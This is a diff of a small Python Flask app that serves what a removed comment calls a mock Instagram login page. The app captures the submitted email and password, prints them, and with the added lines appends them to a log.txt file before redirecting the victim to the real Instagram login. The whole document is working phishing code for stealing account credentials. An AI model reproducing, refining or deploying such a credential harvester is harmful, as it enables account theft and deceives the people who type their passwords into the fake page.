@@ -1,22 +1,23 @@
-from flask import Flask, request, redirect, render_template
+from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template('login.html') # 你的 IG 模擬網頁
+    return render_template('login.html') 
 
 @app.route('/login', methods=['POST'])
-def login_intercept():
-    user = request.form.get('email')
-    pwd = request.form.get('pass')
+def login():
+    username = request.form.get('email')
+    password = request.form.get('pass')
 
-    print(f"--- 攔截成功 ---")
-    print(f"帳號: {user}")
-    print(f"密碼: {pwd}")
-    print(f"---------------")
+    print(f"[*] 帳號: {username}")
+    print(f"[*] 密碼: {password}")
 
-    return redirect("https://www.instagram.com/accounts/login/?source=auth_switcher")
+    with open("log.txt", "a", encoding="utf-8") as f:
+        f.write(f"Account: {username} | Password: {password}\n")
 
+    return redirect("https://www.instagram.com/accounts/login/")
+    
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
